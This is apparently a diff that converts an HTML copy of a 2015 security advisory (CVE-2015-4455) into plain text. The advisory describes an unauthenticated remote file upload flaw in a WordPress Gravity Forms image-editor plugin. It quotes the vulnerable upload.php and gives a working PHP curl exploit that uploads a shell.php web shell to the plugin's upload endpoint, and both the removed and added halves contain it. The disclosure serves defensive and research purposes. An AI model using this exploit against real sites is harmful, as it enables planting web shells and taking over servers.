@@ -1,68 +1,75 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 125&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-06-07&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/aviary-image-editor-add-on-for-gravity-forms">https://wordpress.org/plugins/aviary-image-editor-add-on-for-gravity-forms</a>"&gt;<a href="https://wordpress.org/plugins/aviary-image-editor-add-on-for-gravity-forms&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/aviary-image-editor-add-on-for-gravity-forms&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Waters Edge Web Design and NetherWorks LLC&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-06-08&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:plugins@wordpress.org">plugins@wordpress.org</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;A plugin that integrates the awesome Adobe Creative SDK (formerly Aviary) Photo / Image Editor with the Gravity Forms Plugin.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;There is a remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms/includes/upload.php as an unauthenticated user can upload any file to the system.  Including a .php file.  The upload.php doesn&amp;#039;t check that the user is authenticated and a simple post will allow arbitrary code to be uploaded to the server.
-</p><p>In the file aviary-image-editor-add-on-for-gravity-forms/includes/upload.php the code doesn&amp;rsquo;t check for an authenticated Wordpress user:
-</p><p> 1 &amp;lt;?php<br/>
- 2 <br/>
- 3 $filename = $<u>SERVER[&amp;quot;DOCUMENT</u>ROOT&amp;quot;].&amp;quot;/wp-load.php&amp;quot;;
- 4 if (file_exists($filename)) {<br/>
- 5     include_once($filename);<br/>
- 6 } else {<br/>
- 7     include_once(&amp;quot;../../../../wp-load.php&amp;quot;);
- 8 }<br/>
- 9 echo &amp;quot;Here&amp;quot;;<br/>
-10 $image_file = $<u>FILES[&amp;#039;gf</u>aviary_file&amp;#039;];
-11 if($image_file[&amp;#039;name&amp;#039;]!=&amp;#039;&amp;#039;){
-</p><pre>
-12      $max_file_size =  4<em>1024</em>1024;
-13      $file_size = intval($image_file[&amp;#039;size&amp;#039;]);
-14      if( $file_size &amp;gt; $max_file_size ){
-15          $msg = &amp;quot;File Size is too big.&amp;quot;;
-16          $error_flag = true;
-17      }
-18      $extension = strtolower(end(explode(&amp;#039;.&amp;#039;, $image_file[&amp;#039;name&amp;#039;])));
-19      $aa_options = get_option(&amp;#039;gf_aa_options&amp;#039;);
-20      $supported_files = $aa_options[&amp;#039;supported_file_format&amp;#039;];
-21      $supported_files = strtolower($supported_files);
-22      if(!$error_flag &amp;amp;&amp;amp; $supported_files != &amp;#039;&amp;#039; ){
-23        $supported_files = explode (&amp;#039;,&amp;#039;, $supported_files);
-24        if(!in_array($extension, $supported_files)){
-25           $msg = &amp;quot;No Supported file.&amp;quot;;
-26           $error_flag = true;
-27        }
-28      }
-29      if(!$error_flag){
-30         $wp_upload_dir = wp_upload_dir();
-31         if(!is_dir($wp_upload_dir[&amp;#039;basedir&amp;#039;].&amp;#039;/gform_aviary&amp;#039;)){
-32              mkdir($wp_upload_dir[&amp;#039;basedir&amp;#039;].&amp;#039;/gform_aviary&amp;#039;);
-33         }
-34         $upload_dir = $wp_upload_dir[&amp;#039;basedir&amp;#039;].&amp;#039;/gform_aviary/&amp;#039;;
-35         $upload_url = $wp_upload_dir[&amp;#039;baseurl&amp;#039;].&amp;#039;/gform_aviary/&amp;#039;;
-36         $file_name = $upload_dir.$<u>POST[&amp;#039;gf</u>aviary_field_id&amp;#039;].&amp;#039;<u>&amp;#039;.$image</u>file[&amp;#039;name&amp;#039;    ];
-37         if(move_uploaded_file($image_file[&amp;#039;tmp_name&amp;#039;], $file_name)){
-38             $file_url = $upload_url.$<u>POST[&amp;#039;gf</u>aviary_field_id&amp;#039;].&amp;#039;<u>&amp;#039;.$image</u>file[&amp;#039;na    me&amp;#039;];
-39         }
-40     }
-41     $return_obj = array(&amp;#039;status&amp;#039; =&amp;gt; &amp;#039;success&amp;#039;, &amp;#039;message&amp;#039; =&amp;gt; $file_url);
-42     echo json_encode($return_obj);
-</pre>
-<p>43  }<br/>
-44 ?&amp;gt;<br/>
-&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-4455&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=125"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/*Remote shell upload exploit for aviary-image-editor-add-on-for-gravity-forms v3.0beta <em>/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/</em>Larry W. Cashdollar @<u>larry0&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;6/7/2015&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;shell will be located <a href="http://www.vapidlabs.com/wp-content/uploads/gform</u>aviary/_shell.php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">http://www.vapidlabs.com/wp-content/uploads/gform_aviary/_shell.php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;*/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #000088;"&gt;$target_url&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;'<a href="http://www.vapidlabs.com/wp-content/plugins/aviary-image-editor-add-on-for-gravity-forms/includes/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">http://www.vapidlabs.com/wp-content/plugins/aviary-image-editor-add-on-for-gravity-forms/includes/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #0000ff;"&gt;upload.php'&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #000088;"&gt;$file_name_with_full_path&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;'/var/www/shell.php'&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;POST to &lt;span style="color: #006699; font-weight: bold;"&gt;$target_url&lt;/span&gt; &lt;span style="color: #006699; font-weight: bold;"&gt;$file_name_with_full_path&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #000088;"&gt;$post&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/array">http://www.php.net/array</a>"&gt;&lt;span style="color: #990000;"&gt;array&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'name'&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;'shell.php'&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'gf_aviary_file'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'@'&lt;/span&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;span style="color: #000088;"&gt;$file_name_with_full_path&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #000088;"&gt;$ch&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/curl_init">http://www.php.net/curl_init</a>"&gt;&lt;span style="color: #990000;"&gt;curl_init&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_URL&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #000088;"&gt;$target_url&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POST&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POSTFIELDS&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #000088;"&gt;$post&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_RETURNTRANSFER&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #000088;"&gt;$result&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;a href="<a href="http://www.php.net/curl_exec">http://www.php.net/curl_exec</a>"&gt;&lt;span style="color: #990000;"&gt;curl_exec&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;a href="<a href="http://www.php.net/curl_close">http://www.php.net/curl_close</a>"&gt;&lt;span style="color: #990000;"&gt;curl_close&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;&amp;lt;hr&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #000088;"&gt;$result&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;&amp;lt;hr&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;?&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=125">http://www.vapid.dhs.org/advisory.php?v=125</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=125&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=125&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                 Advisory #: 125
+Title: Remote file upload vulnerability in aviary-image-editor-add-on-for-
+gravity-forms v3.0beta Wordpress plugin
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-06-07
+Download Site: https://wordpress.org/plugins/aviary-image-editor-add-on-for-
+gravity-forms
+Vendor:Waters Edge Web Design and NetherWorks LLC
+Vendor Notified: 2015-06-08
+Vendor Contact: plugins@wordpress.org
+Description: A plugin that integrates the awesome Adobe Creative SDK (formerly
+Aviary) Photo / Image Editor with the Gravity Forms Plugin.
+Vulnerability:
+There is a remote file upload vulnerability in aviary-image-editor-add-on-for-
+gravity-forms/includes/upload.php as an unauthenticated user can upload any file
+to the system. Including a .php file. The upload.php doesn't check that the user
+is authenticated and a simple post will allow arbitrary code to be uploaded to
+the server. In the file aviary-image-editor-add-on-for-gravity-forms/includes/
+upload.php the code doesn’t check for an authenticated Wordpress user: 1 <?php 2
+3 $filename = $_SERVER["DOCUMENT_ROOT"]."/wp-load.php"; 4 if (file_exists
+($filename)) { 5 include_once($filename); 6 } else { 7 include_once("../../../../
+wp-load.php"); 8 } 9 echo "Here"; 10 $image_file = $_FILES['gf_aviary_file']; 11
+if($image_file['name']!=''){ 12 $max_file_size = 4*1024*1024; 13 $file_size =
+intval($image_file['size']); 14 if( $file_size > $max_file_size ){ 15 $msg =
+"File Size is too big."; 16 $error_flag = true; 17 } 18 $extension = strtolower
+(end(explode('.', $image_file['name']))); 19 $aa_options = get_option
+('gf_aa_options'); 20 $supported_files = $aa_options['supported_file_format']; 21
+$supported_files = strtolower($supported_files); 22 if(!$error_flag &&
+$supported_files != '' ){ 23 $supported_files = explode (',', $supported_files);
+24 if(!in_array($extension, $supported_files)){ 25 $msg = "No Supported file.";
+26 $error_flag = true; 27 } 28 } 29 if(!$error_flag){ 30 $wp_upload_dir =
+wp_upload_dir(); 31 if(!is_dir($wp_upload_dir['basedir'].'/gform_aviary')){ 32
+mkdir($wp_upload_dir['basedir'].'/gform_aviary'); 33 } 34 $upload_dir =
+$wp_upload_dir['basedir'].'/gform_aviary/'; 35 $upload_url = $wp_upload_dir
+['baseurl'].'/gform_aviary/'; 36 $file_name = $upload_dir.$_POST
+['gf_aviary_field_id'].'_'.$image_file['name' ]; 37 if(move_uploaded_file
+($image_file['tmp_name'], $file_name)){ 38 $file_url = $upload_url.$_POST
+['gf_aviary_field_id'].'_'.$image_file['na me']; 39 } 40 } 41 $return_obj = array
+('status' => 'success', 'message' => $file_url); 42 echo json_encode
+($return_obj); 43 } 44 ?>
+CVE-2015-4455
+JSON:Export
+Exploit Code:
+   1. <?php
+   2. /*Remote shell upload exploit for aviary-image-editor-add-on-for-gravity-
+      forms v3.0beta */
+   3. /*Larry W. Cashdollar @_larry0
+   4. 6/7/2015
+   5. shell will be located http://www.vapidlabs.com/wp-content/uploads/
+      gform_aviary/_shell.php
+   6. */
+   7.  
+   8.  
+   9.        $target_url = 'http://www.vapidlabs.com/wp-content/plugins/aviary-
+      image-editor-add-on-for-gravity-forms/includes/
+  10. upload.php';
+  11.        $file_name_with_full_path = '/var/www/shell.php';
+  12.  
+  13.        echo "POST to $target_url $file_name_with_full_path";
+  14.        $post = array('name' =>
+      'shell.php','gf_aviary_file'=>'@'.$file_name_with_full_path);
+  15.  
+  16.        $ch = curl_init();
+  17.        curl_setopt($ch, CURLOPT_URL,$target_url);
+  18.        curl_setopt($ch, CURLOPT_POST,1);
+  19.        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+  20.        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+  21.        $result=curl_exec ($ch);
+  22.        curl_close ($ch);
+  23.        echo "<hr>";
+  24.        echo $result;
+  25.        echo "<hr>";
+  26. ?>
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisory.php?v=125
